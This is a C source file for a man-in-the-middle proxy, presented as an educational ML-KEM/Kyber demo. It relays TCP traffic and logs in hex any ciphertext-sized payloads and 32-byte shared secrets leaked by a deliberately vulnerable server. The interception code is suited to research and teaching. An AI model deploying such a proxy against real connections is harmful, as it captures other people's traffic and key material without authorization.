/**
 * mitm_oracle.c
 * ------------------------------------------------------------
 * Academic Man-in-the-Middle (MitM) Oracle Proxy for ML-KEM Demo
 *
 * Threat Model:
 *   Client  <-->  MitM Oracle Proxy  <-->  Vulnerable Kyber Server
 *
 * This proxy transparently forwards traffic while monitoring
 * ciphertext-sized payloads and exposed shared secrets.
 *
 * Intended strictly for educational and research demonstration.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/select.h>

#define MAXBUF 2048
#define KYBER_CT_LEN 1088
#define KYBER_SS_LEN 32

/* ANSI color codes for styled console output */
#define RED   "\033[1;31m"
#define GRN   "\033[1;32m"
#define YEL   "\033[1;33m"
#define CYN   "\033[1;36m"
#define RST   "\033[0m"

static void hexdump(const char *label, const unsigned char *buf, size_t len) {
    printf("%s%s (%zu bytes): ", RED, label, len);
    for (size_t i = 0; i < len; i++) {
        printf("%02x", buf[i]);
    }
    printf("%s\n", RST);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr,
            "Usage: %s <server_ip:port> <listen_port>\n"
            "Example: %s 127.0.0.1:8080 9090\n",
            argv[0], argv[0]);
        exit(EXIT_FAILURE);
    }

    char server_ip[64];
    int server_port, listen_port;
    sscanf(argv[1], "%63[^:]:%d", server_ip, &server_port);
    listen_port = atoi(argv[2]);

    printf(CYN "[MitM] Initializing Oracle Proxy..." RST "\n");
    printf(CYN "[MitM] Forwarding to %s:%d" RST "\n", server_ip, server_port);
    printf(CYN "[MitM] Listening on port %d" RST "\n\n", listen_port);

    int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in listen_addr = {0};
    listen_addr.sin_family = AF_INET;
    listen_addr.sin_addr.s_addr = INADDR_ANY;
    listen_addr.sin_port = htons(listen_port);

    bind(listen_fd, (struct sockaddr *)&listen_addr, sizeof(listen_addr));
    listen(listen_fd, 5);

    while (1) {
        printf(CYN "[MitM] Awaiting client connection..." RST "\n");
        int client_fd = accept(listen_fd, NULL, NULL);

        int server_fd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in server_addr = {0};
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);
        inet_pton(AF_INET, server_ip, &server_addr.sin_addr);

        connect(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr));

        unsigned char buf[MAXBUF];
        fd_set fds;

        while (1) {
            FD_ZERO(&fds);
            FD_SET(client_fd, &fds);
            FD_SET(server_fd, &fds);

            int maxfd = (client_fd > server_fd ? client_fd : server_fd) + 1;
            if (select(maxfd, &fds, NULL, NULL, NULL) < 0) break;

            /* Forward data from Client to Server */
            if (FD_ISSET(client_fd, &fds)) {
                ssize_t n = recv(client_fd, buf, sizeof(buf), 0);
                if (n <= 0) break;

                if (n == KYBER_CT_LEN) {
                    printf(YEL "[Oracle] Ciphertext Detected" RST "\n");
                    hexdump("Ciphertext", buf, n);
                }
                send(server_fd, buf, n, 0);
            }

            /* Forward data from Server to Client */
            if (FD_ISSET(server_fd, &fds)) {
                ssize_t n = recv(server_fd, buf, sizeof(buf), 0);
                if (n <= 0) break;

                if (n == KYBER_SS_LEN) {
                    printf(GRN "[Leak] Shared Secret Observed" RST "\n");
                    hexdump("Secret", buf, n);
                }
                send(client_fd, buf, n, 0);
            }
        }

        close(client_fd);
        close(server_fd);
        printf(CYN "[MitM] Connection closed." RST "\n\n");
    }
    return 0;
}